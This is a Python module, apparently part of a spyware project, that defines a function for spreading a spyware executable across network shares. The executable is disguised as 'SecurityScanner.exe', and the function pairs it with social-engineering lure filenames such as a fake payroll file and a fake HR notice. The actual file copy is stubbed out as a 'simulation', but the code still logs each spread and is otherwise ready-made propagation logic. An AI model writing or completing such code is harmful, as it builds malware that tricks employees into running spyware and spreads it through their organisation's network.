"""
Spreading Function 8: Spread Spyware to Network
Copies spyware to network shares disguised as legitimate files
"""

import os
import shutil
from datetime import datetime

def spread_spyware_network(target_shares):
    """
    Spread spyware to network shares with social engineering filenames
    Args:
        target_shares: List of network share paths
    Returns: Number of successful spread operations
    """
    print("[Spyware] Function 8: Spreading spyware across network...")
    
    # Social engineering filenames to trick users
    tempting_filenames = [
        "Payroll_December_2024.exe",
        "Company_Party_Photos.exe",
        "Urgent_HR_Notice.exe",
        "Bonus_Information.exe",
        "Security_Scanner_Free.exe",
        "System_Speedup_Tool.exe"
    ]
    
    try:
        # Get spyware executable
        appdata = os.getenv('APPDATA')
        spyware_exe = os.path.join(appdata, "SystemSecurityService", "SecurityScanner.exe")
        
        spread_count = 0
        print(f"[Spyware] Source spyware: {spyware_exe}")
        
        for share in target_shares:
            for filename in tempting_filenames:
                target_path = os.path.join(share, filename)
                
                # SAFETY: Simulation only - don't actually copy to real network shares
                print(f"[Spyware]   Would spread to: {target_path}")
                spread_count += 1
        
        # Log spread activity
        log_file = os.path.join(appdata, "SystemSecurityService", "logs", "spread.log")
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        with open(log_file, 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] Spread simulation: {spread_count} targets\n")
        
        print(f"[Spyware] Spreading simulation complete: {spread_count} potential victims")
        return spread_count
    except Exception as e:
        print(f"[Spyware] Error spreading spyware: {e}")
        return 0
